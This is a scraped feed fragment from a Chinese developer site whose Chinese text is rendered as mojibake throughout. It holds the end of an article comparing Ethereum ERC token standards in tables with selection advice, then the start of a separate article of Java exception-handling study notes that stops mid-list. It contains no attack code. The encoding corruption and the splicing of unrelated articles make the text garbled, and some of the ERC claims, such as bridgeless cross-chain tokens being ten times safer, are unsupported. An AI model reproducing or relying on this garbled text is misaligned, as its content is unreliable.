<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>åŠŸèƒ½ç®€è¿°</th><th>åº”ç”¨åœºæ™¯</th><th>2025å¹´çŠ¶æ€</th></tr></thead><tbody><tr><td><strong>ERC-721</strong></td><td>NFT Standard</td><td>å”¯ä¸€Token IDï¼Œä¸å¯åˆ†å‰²</td><td>æ•°å­—è‰ºæœ¯å“ã€PFPã€æ”¶è—å“</td><td>âœ… NFTé»„é‡‘æ ‡å‡†</td></tr><tr><td><strong>ERC-1155</strong></td><td>Multi-Token</td><td>åŒæ—¶æ”¯æŒFTå’ŒNFTï¼Œæ‰¹é‡æ“ä½œ</td><td>GameFiè£…å¤‡ã€å…ƒå®‡å®™èµ„äº§</td><td>âœ… GameFié¦–é€‰ï¼Œæ•ˆç‡æ›´é«˜</td></tr><tr><td><strong>ERC-721A</strong></td><td>Gas-Optimized NFT</td><td>æ‰¹é‡é“¸é€ èŠ‚çœ60% Gas</td><td>å¤§å‹é¡¹ç›®å‘è¡Œï¼ˆå¦‚Azukiï¼‰</td><td>âœ… 2025å¹´ä¸»æµå‘è¡Œæ–¹æ¡ˆ</td></tr><tr><td><strong>ERC-2981</strong></td><td>Royalty Standard</td><td>NFTç‰ˆç¨ä¿¡æ¯æ ‡å‡†åŒ–</td><td>è·¨å¸‚åœºç‰ˆç¨æ‰§è¡Œ</td><td>âœ… å¸‚åœºå¼ºåˆ¶è¦æ±‚</td></tr></tbody></table>
<h4 data-id="heading-5">3. <strong>æ”¶ç›Šä¸é‡‘åº“æ ‡å‡†</strong></h4>


























<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>ä»£è¡¨é¡¹ç›®</th><th>é‡è¦æ€§</th></tr></thead><tbody><tr><td><strong>ERC-4626</strong></td><td>Tokenized Vault</td><td>ç»Ÿä¸€é‡‘åº“å­˜å–æ¬¾æ¥å£ï¼Œè‡ªåŠ¨å¤åˆ©</td><td>Yearnã€Aaveã€Compound</td><td>â­â­â­â­â­ æ”¶ç›Šå±‚äº‹å®æ ‡å‡†</td></tr><tr><td><strong>ERC-4626æ‰©å±•</strong></td><td>æ”¶ç›Šä¼˜åŒ–</td><td>æ»‘ç‚¹ä¿æŠ¤ã€çº¿æ€§é‡Šæ”¾</td><td>Balancerã€Aura</td><td>â­â­â­â­ å¤§å‹DeFiæ ‡é…</td></tr></tbody></table>
<h4 data-id="heading-6">4. <strong>ç°å®ä¸–ç•Œèµ„äº§ï¼ˆRWAï¼‰åˆè§„æ ‡å‡†</strong></h4>

































<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>é€‚ç”¨èµ„äº§</th><th>ç›‘ç®¡è¦æ±‚</th></tr></thead><tbody><tr><td><strong>ERC-3643</strong></td><td>T-REX Protocol</td><td>å¼ºåˆ¶èº«ä»½éªŒè¯ã€åŠ¨æ€åˆè§„è§„åˆ™</td><td>è¯åˆ¸ã€æˆ¿åœ°äº§ã€åŸºé‡‘</td><td>âœ… é¦™æ¸¯RWAå¹³å°å¼ºåˆ¶ä½¿ç”¨</td></tr><tr><td><strong>ERC-1400</strong></td><td>Security Token</td><td>è¯åˆ¸å‹ä»£å¸æ ‡å‡†</td><td>STOå‘è¡Œ</td><td>âš ï¸ è¢«ERC-3643é€æ­¥æ›¿ä»£</td></tr><tr><td><strong>ERC-3475</strong></td><td>Bonds Standard</td><td>å€ºåˆ¸æ ‡å‡†ï¼Œå¤æ‚è®¡æ¯</td><td>é“¾ä¸Šå€ºåˆ¸</td><td>ğŸ”¥ 2025å¹´å€ºåˆ¸ä»£å¸åŒ–çƒ­ç‚¹</td></tr></tbody></table>
<h4 data-id="heading-7">5. <strong>è´¦æˆ·ä¸ç­¾åæ ‡å‡†</strong></h4>

































<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>è§£å†³ç—›ç‚¹</th><th>æ™®åŠåº¦</th></tr></thead><tbody><tr><td><strong>ERC-4337</strong></td><td>Account Abstraction</td><td>æ™ºèƒ½åˆçº¦é’±åŒ…ï¼Œç¤¾äº¤æ¢å¤</td><td>ç§é’¥ä¸¢å¤±ã€æ‰¹é‡æ“ä½œ</td><td>âœ… MetaMask/Coinbaseå·²æ”¯æŒ</td></tr><tr><td><strong>ERC-1271</strong></td><td>Contract Signature</td><td>åˆçº¦é’±åŒ…ç­¾åéªŒè¯</td><td>Gnosis Safeäº¤äº’</td><td>âœ… å¤šç­¾/æ™ºèƒ½é’±åŒ…åŸºçŸ³</td></tr><tr><td><strong>ERC-5267</strong></td><td>EIP-712 Discovery</td><td>é“¾ä¸Šå‘ç°ç±»å‹å®šä¹‰</td><td>é’±åŒ…è‡ªåŠ¨è§£æç­¾å</td><td>ğŸ”¥ 2025å¹´é’±åŒ…é›†æˆä¸­</td></tr></tbody></table>
<h4 data-id="heading-8">6. <strong>è·¨é“¾ä¸äº’æ“ä½œæ ‡å‡†</strong></h4>


























<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>ä»£è¡¨é¡¹ç›®</th><th>çŠ¶æ€</th></tr></thead><tbody><tr><td><strong>ERC-7765</strong></td><td>Omnichain FT</td><td>åŸç”Ÿè·¨é“¾FTï¼ˆæ— æ¡¥ï¼‰</td><td>LayerZero Omniä»£å¸</td><td>ğŸ”¥ 2025è·¨é“¾æ–°æ ‡å‡†</td></tr><tr><td><strong>ERC-7651</strong></td><td>Omnichain NFT</td><td>åŸç”Ÿè·¨é“¾NFT</td><td>å…¨é“¾æ¸¸æˆèµ„äº§</td><td>ğŸ”¥ å…¨é“¾æ¸¸æˆå¿…å¤‡</td></tr></tbody></table>
<h4 data-id="heading-9">7. <strong>ç‰ˆç¨ä¸å…ƒæ•°æ®æ ‡å‡†</strong></h4>

































<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>åº”ç”¨åœºæ™¯</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td><strong>ERC-2981</strong></td><td>Royalty Standard</td><td>ç‰ˆç¨ä¿¡æ¯é“¾ä¸Šæ ‡å‡†åŒ–</td><td>NFTå¸‚åœºè·¨å¹³å°ç‰ˆç¨</td><td>âš ï¸ å¼ºåˆ¶æ‰§è¡Œä»ä¾èµ–å¸‚åœº</td></tr><tr><td><strong>ERC-4883</strong></td><td>SVG NFT</td><td>å¯ç»„åˆSVGæ ¼å¼</td><td>é“¾ä¸Šæ¸¸æˆã€åŠ¨æ€è‰ºæœ¯</td><td>ğŸ”¥ èŠ‚çœGasï¼Œå®Œå…¨é“¾ä¸Š</td></tr><tr><td><strong>ERC-1948</strong></td><td>Dynamic Data NFT</td><td>32å­—èŠ‚æ•°æ®å­—æ®µå¯æ›´æ–°</td><td>å¯è¿›åŒ–NFT</td><td>âš ï¸ ä½¿ç”¨è¾ƒå°‘</td></tr></tbody></table>
<h4 data-id="heading-10">8. <strong>æ–°å…´æ ‡å‡†</strong></h4>








































<table><thead><tr><th>æ ‡å‡†</th><th>åç§°</th><th>åˆ›æ–°ç‚¹</th><th>èµ›é“</th><th>æˆç†Ÿåº¦</th></tr></thead><tbody><tr><td><strong>ERC-7007</strong></td><td>AI-NFT</td><td>ç»‘å®šAIæ¨¡å‹ä¸ç”Ÿæˆè¯æ˜</td><td>AIGC</td><td>ğŸ”¬ å®éªŒé˜¶æ®µ</td></tr><tr><td><strong>ERC-721C</strong></td><td>Creator Token</td><td>å¯ç¼–ç¨‹ç‰ˆç¨ç‡ï¼ˆä¸é™2.5%ï¼‰</td><td>åˆ›ä½œè€…ç»æµ</td><td>ğŸ”¥ å¼€å§‹æ™®åŠ</td></tr><tr><td><strong>ERC-7512</strong></td><td>Onchain Audit</td><td>é“¾ä¸Šå­˜å‚¨å®¡è®¡æŠ¥å‘Š</td><td>å®‰å…¨</td><td>ğŸ”¬ å®¡è®¡æ ‡å‡†åŒ–</td></tr><tr><td><strong>ERC-7231</strong></td><td>Identity Aggregator</td><td>å¤šé“¾èº«ä»½èšåˆ</td><td>AIä»£ç†èº«ä»½</td><td>ğŸ”¬ æ—©æœŸé‡‡ç”¨</td></tr></tbody></table>
<h2 data-id="heading-11"><strong>å¿«é€Ÿé€‰æ‹©å†³ç­–è¡¨</strong></h2>





















































<table><thead><tr><th>ä½ çš„éœ€æ±‚</th><th>ç¬¬ä¸€é€‰æ‹©</th><th>å¤‡é€‰æ–¹æ¡ˆ</th><th>é¿å…ä½¿ç”¨</th></tr></thead><tbody><tr><td>å‘æ²»ç†ä»£å¸</td><td>ERC-20 + ERC-2612</td><td>çº¯ERC-20</td><td>ERC-721ï¼ˆç”¨é”™æ ‡å‡†ï¼‰</td></tr><tr><td>å‘NFTé¡¹ç›®</td><td>ERC-721A</td><td>ERC-721</td><td>ERC-1155ï¼ˆé™¤éGameFiï¼‰</td></tr><tr><td>åšGameFi</td><td>ERC-1155</td><td>ERC-721A</td><td>ERC-20ï¼ˆä¸å¯æ›¿ä»£ï¼‰</td></tr><tr><td>å»ºæ”¶ç›Šæ± </td><td>ERC-4626</td><td>è‡ªå®šä¹‰é‡‘åº“</td><td>æ‰‹åŠ¨åˆ†å‘æ”¶ç›Š</td></tr><tr><td>å‘RWAèµ„äº§</td><td>ERC-3643</td><td>æ— </td><td>ERC-20ï¼ˆä¸åˆè§„ï¼‰</td></tr><tr><td>æ™ºèƒ½é’±åŒ…</td><td>ERC-4337</td><td>æ— </td><td>EOAé’±åŒ…ï¼ˆä½“éªŒå·®ï¼‰</td></tr><tr><td>è·¨é“¾èµ„äº§</td><td>ERC-7765</td><td>ERC-7651</td><td>åŸç”Ÿæ¡¥ï¼ˆé£é™©é«˜ï¼‰</td></tr></tbody></table>
<h2 data-id="heading-12"><strong>é€‰å‹å»ºè®®</strong></h2>
<ul>
<li><strong>æ–°é¡¹ç›®å¿…é¡»é›†æˆERC-2612ï¼šå‘Šåˆ«æ— é™æˆæƒï¼Œæå‡ç”¨æˆ·ä½“éªŒ</strong></li>
<li><strong>DeFié¡¹ç›®å¿…é¡»é‡‡ç”¨ERC-4626ï¼šé™ä½å¤–éƒ¨é›†æˆæˆæœ¬ï¼Œè‡ªåŠ¨è·å¾—èšåˆå™¨æ”¯æŒ</strong></li>
<li><strong>RWAé¡¹ç›®å¿…é€‰ERC-3643ï¼šé¦™æ¸¯ã€æ–°åŠ å¡ç›‘ç®¡æ˜ç¡®è¦æ±‚</strong></li>
<li><strong>é’±åŒ…å¿…é¡»æ”¯æŒERC-4337ï¼šæä¾›ç¤¾äº¤æ¢å¤å’Œgasä»£ä»˜ï¼Œå¦åˆ™ç”¨æˆ·æµå¤±</strong></li>
<li><strong>è·¨é“¾é¡¹ç›®å…³æ³¨ERC-7765ï¼šåŸç”Ÿè·¨é“¾æ¯”æ¡¥æ¥å®‰å…¨10å€ä»¥ä¸Š</strong></li>
</ul>
<h2 data-id="heading-13">æ€»ç»“</h2>
<p>ERC-20/721æ˜¯"è¿‡å»"ï¼ŒERC-4626/3643/4337æ˜¯"ç°åœ¨"ï¼ŒERC-7765/7007/7512æ˜¯"æœªæ¥"ã€‚2025å¹´å¼€å‘æ–°é¡¹ç›®ï¼Œåˆè§„æ€§ï¼ˆRWAç”¨3643ï¼‰ã€ç”¨æˆ·ä½“éªŒï¼ˆé’±åŒ…ç”¨4337ï¼‰ã€æ€§èƒ½ï¼ˆæ‰©å®¹ç”¨ZKï¼‰ä¸‰è€…ç¼ºä¸€ä¸å¯ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å­¦ä¹ ç¬”è®°:å¼‚å¸¸ï¼Œæ³›å‹ï¼Œé›†åˆï¼ˆä»£ç ç¤ºä¾‹ï¼Œä¼ä¸šé¢è¯•é¢˜ï¼Œä¼ä¸šå®é™…åº”ç”¨åœºæ™¯ï¼‰]]></title>    <link>https://juejin.cn/post/7581004702945214491</link>    <guid>https://juejin.cn/post/7581004702945214491</guid>    <pubDate>2025-12-08T04:04:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581004702945214491" data-draft-id="7581004702945181723" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å­¦ä¹ ç¬”è®°:å¼‚å¸¸ï¼Œæ³›å‹ï¼Œé›†åˆï¼ˆä»£ç ç¤ºä¾‹ï¼Œä¼ä¸šé¢è¯•é¢˜ï¼Œä¼ä¸šå®é™…åº”ç”¨åœºæ™¯ï¼‰"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T04:04:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sin60"/> <meta itemprop="url" content="https://juejin.cn/user/1576027017202505"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å­¦ä¹ ç¬”è®°:å¼‚å¸¸ï¼Œæ³›å‹ï¼Œé›†åˆï¼ˆä»£ç ç¤ºä¾‹ï¼Œä¼ä¸šé¢è¯•é¢˜ï¼Œä¼ä¸šå®é™…åº”ç”¨åœºæ™¯ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1576027017202505/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sin60
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:04:45.000Z" title="Mon Dec 08 2025 04:04:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€ã€å¼‚å¸¸ï¼ˆExceptionï¼‰</h3>
<p>å¼‚å¸¸æ˜¯ Java å¤„ç†ç¨‹åºè¿è¡Œæ—¶é”™è¯¯çš„æ ¸å¿ƒæœºåˆ¶ï¼Œä¼ä¸šå¼€å‘ä¸­è¦æ±‚ç²¾å‡†æ•è·ã€åˆç†æŠ›å‡ºã€è§„èŒƒå¤„ç†ï¼Œé¿å…ç¨‹åºå´©æºƒæˆ–éšè—é—®é¢˜ã€‚</p>
<h4 data-id="heading-1">1. æ ¸å¿ƒä»£ç ç¤ºä¾‹ï¼ˆåˆ†ç±»å¤„ç† + è‡ªå®šä¹‰å¼‚å¸¸ï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.FileInputStream;
<span class="hljs-keyword">import</span> java.io.FileNotFoundException;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-comment">/**
 * å¼‚å¸¸æ ¸å¿ƒç¤ºä¾‹ï¼š
 * 1. ç¼–è¯‘æ—¶å¼‚å¸¸ï¼ˆæ£€æŸ¥å‹ï¼‰å¤„ç†ï¼ˆtry-catch/throwsï¼‰
 * 2. è¿è¡Œæ—¶å¼‚å¸¸ï¼ˆéæ£€æŸ¥å‹ï¼‰å¤„ç†
 * 3. è‡ªå®šä¹‰ä¸šåŠ¡å¼‚å¸¸
 */</span>
<span class="hljs-comment">// è‡ªå®šä¹‰ä¸šåŠ¡å¼‚å¸¸ï¼ˆä¼ä¸šä¸­ç”¨äºæ ‡è¯†ç‰¹å®šä¸šåŠ¡é”™è¯¯ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BusinessException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RuntimeException</span> {
    <span class="hljs-comment">// å¸¦é”™è¯¯ä¿¡æ¯çš„æ„é€ æ–¹æ³•</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BusinessException</span><span class="hljs-params">(String message)</span> {
        <span class="hljs-built_in">super</span>(message);
    }
    <span class="hljs-comment">// å¸¦é”™è¯¯ä¿¡æ¯+æ ¹å› çš„æ„é€ æ–¹æ³•ï¼ˆä¾¿äºæ’æŸ¥é—®é¢˜ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BusinessException</span><span class="hljs-params">(String message, Throwable cause)</span> {
        <span class="hljs-built_in">super</span>(message, cause);
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExceptionDemo</span> {
    <span class="hljs-comment">// è¯»å–æ–‡ä»¶ï¼ˆæŠ›å‡ºç¼–è¯‘æ—¶å¼‚å¸¸ï¼Œç”±è°ƒç”¨æ–¹å¤„ç†ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">if</span> (path == <span class="hljs-literal">null</span> || !path.endsWith(<span class="hljs-string">".txt"</span>)) {
            <span class="hljs-comment">// æŠ›å‡ºè¿è¡Œæ—¶å¼‚å¸¸ï¼ˆå‚æ•°éæ³•ï¼‰</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"æ–‡ä»¶è·¯å¾„éæ³•ï¼Œå¿…é¡»æ˜¯txtæ–‡ä»¶"</span>);
        }
        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path);
        fis.close();
    }

    <span class="hljs-comment">// å¤„ç†ä¸šåŠ¡é€»è¾‘ï¼ˆå°è£…åº•å±‚å¼‚å¸¸ä¸ºä¸šåŠ¡å¼‚å¸¸ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doBusiness</span><span class="hljs-params">(String filePath)</span> {
        <span class="hljs-keyword">try</span> {
            readFile(filePath);
            System.out.println(<span class="hljs-string">"æ–‡ä»¶è¯»å–æˆåŠŸï¼Œä¸šåŠ¡å¤„ç†å®Œæˆ"</span>);
        } <span class="hljs-keyword">catch</span> (IllegalArgumentException e) {
            <span class="hljs-comment">// æ•è·å‚æ•°å¼‚å¸¸ï¼ŒåŒ…è£…ä¸ºä¸šåŠ¡å¼‚å¸¸æŠ›å‡ºï¼ˆç»Ÿä¸€å¼‚å¸¸ç±»å‹ï¼‰</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BusinessException</span>(<span class="hljs-string">"ä¸šåŠ¡å¤„ç†å¤±è´¥ï¼šå‚æ•°é”™è¯¯"</span>, e);
        } <span class="hljs-keyword">catch</span> (FileNotFoundException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BusinessException</span>(<span class="hljs-string">"ä¸šåŠ¡å¤„ç†å¤±è´¥ï¼šæ–‡ä»¶ä¸å­˜åœ¨"</span>, e);
        } <span class="hljs-keyword">catch</span> (IOException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BusinessException</span>(<span class="hljs-string">"ä¸šåŠ¡å¤„ç†å¤±è´¥ï¼šæ–‡ä»¶è¯»å–å¼‚å¸¸"</span>, e);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// æµ‹è¯•å¼‚å¸¸å¤„ç†</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æµ‹è¯•1ï¼šå‚æ•°é”™è¯¯ï¼ˆè¿è¡Œæ—¶å¼‚å¸¸ï¼‰</span>
            <span class="hljs-comment">// doBusiness("test.doc");</span>
            <span class="hljs-comment">// æµ‹è¯•2ï¼šæ–‡ä»¶ä¸å­˜åœ¨ï¼ˆç¼–è¯‘æ—¶å¼‚å¸¸ï¼‰</span>
            doBusiness(<span class="hljs-string">"none.txt"</span>);
        } <span class="hljs-keyword">catch</span> (BusinessException e) {
            <span class="hljs-comment">// ç»Ÿä¸€æ•è·ä¸šåŠ¡å¼‚å¸¸ï¼Œæ‰“å°é”™è¯¯ä¿¡æ¯å’Œæ ¹å› </span>
            System.err.println(<span class="hljs-string">"é”™è¯¯ä¿¡æ¯ï¼š"</span> + e.getMessage());
            <span class="hljs-comment">// æ‰“å°å¼‚å¸¸æ ˆï¼ˆæ’æŸ¥é—®é¢˜ç”¨ï¼‰</span>
            e.printStackTrace();
        }
    }
}
</code></pre>
<p><strong>ä»£ç è¯´æ˜</strong>ï¼š</p>
<ul>
<li><strong>å¼‚å¸¸åˆ†ç±»</strong>ï¼šç¼–è¯‘æ—¶å¼‚å¸¸ï¼ˆ<code>IOException</code>/<code>FileNotFoundException</code>ï¼‰å¿…é¡»æ˜¾å¼å¤„ç†ï¼ˆtry-catch/throwsï¼‰ï¼›è¿è¡Œæ—¶å¼‚å¸¸ï¼ˆ<code>IllegalArgumentException</code>/<code>NullPointerException</code>ï¼‰å¯ä¸ç”¨æ˜¾å¼å¤„ç†ï¼Œä½†ä¼ä¸šä¸­å»ºè®®ä¸»åŠ¨æ•è·ã€‚</li>
<li><strong>è‡ªå®šä¹‰å¼‚å¸¸</strong>ï¼šä¼ä¸šä¸­ä¼šä¸ºä¸åŒä¸šåŠ¡åœºæ™¯å®šä¹‰ä¸“å±å¼‚å¸¸ï¼ˆå¦‚<code>UserNotFoundException</code>ã€<code>OrderException</code>ï¼‰ï¼Œä¾¿äºç»Ÿä¸€å¼‚å¸¸å¤„ç†å’Œå‰ç«¯é”™è¯¯æç¤ºã€‚</li>
<li><strong>å¼‚å¸¸åŒ…è£…</strong>ï¼šåº•å±‚å¼‚å¸¸ï¼ˆå¦‚ IO å¼‚å¸¸ï¼‰åŒ…è£…ä¸ºä¸šåŠ¡å¼‚å¸¸æŠ›å‡ºï¼Œé¿å…ä¸Šå±‚æ„ŸçŸ¥åº•å±‚å®ç°ç»†èŠ‚ï¼Œç¬¦åˆ â€œé¢å‘ä¸šåŠ¡ç¼–ç¨‹â€ æ€æƒ³ã€‚</li>
</ul>
<h4 data-id="heading-2">2. ä¼ä¸šé¢è¯•é¢˜</h4>
<ol>
<li>
<p>é—®ï¼šç¼–è¯‘æ—¶å¼‚å¸¸å’Œè¿è¡Œæ—¶å¼‚å¸¸çš„åŒºåˆ«ï¼Ÿä¼ä¸šä¸­å¦‚ä½•å¤„ç†ï¼Ÿç­”ï¼š</p>
<ul>
<li>ç¼–è¯‘æ—¶å¼‚å¸¸ï¼ˆChecked Exceptionï¼‰ï¼šç»§æ‰¿<code>Exception</code>ï¼ˆé RuntimeExceptionï¼‰ï¼Œç¼–è¯‘æœŸå¼ºåˆ¶å¤„ç†ï¼ˆtry-catch/throwsï¼‰ï¼Œå¦‚<code>IOException</code>ã€<code>SQLException</code>ï¼›</li>
<li>è¿è¡Œæ—¶å¼‚å¸¸ï¼ˆUnchecked Exceptionï¼‰ï¼šç»§æ‰¿<code>RuntimeException</code>ï¼Œç¼–è¯‘æœŸä¸å¼ºåˆ¶å¤„ç†ï¼Œå¦‚<code>NullPointerException</code>ã€<code>IndexOutOfBoundsException</code>ï¼›</li>
